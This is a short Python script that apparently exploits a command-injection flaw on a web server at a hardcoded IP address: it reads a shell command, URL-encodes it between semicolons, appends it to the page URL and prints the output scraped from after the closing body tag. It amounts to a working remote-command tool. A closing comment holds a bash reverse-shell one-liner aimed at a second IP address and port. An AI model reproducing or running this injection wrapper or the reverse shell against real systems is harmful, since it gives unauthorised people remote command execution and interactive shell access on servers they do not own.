#!/usr/bin/env python3
import requests

command = input()
formatted_command = '%3B'
for char in command:
    if char == ' ':
        char = '%20'
    if char == ';':
        char = '%3B'
    if char == '>':
        char = '%3E'
    if char == '.':
        char = '%2E'
    if char == '|':
        char = '%7C'
    formatted_command += char


formatted_command += '%3B'
url = 'http://54.206.178.157:8085/classified.html' + formatted_command
#print(formatted_command)
getRequest = requests.get(url)

#print(getRequest.content)

response = str(getRequest.content)
substring = '</body>'
if substring in response:
    res = str(response[response.find(substring) + len(substring):])

new_res = ''
for char in res:
    if char == "\\":
        char = '\n '
    new_res += char
hope = new_res.splitlines()
newstring = ''
for line in hope:
    nl = line[2:]
    newstring += nl + '\n'
#print(hope[-4])
print('\n' + newstring[8:-2] + '\n')

#

#bash -i >& /dev/tcp/101.113.205.143/8080 0>&1
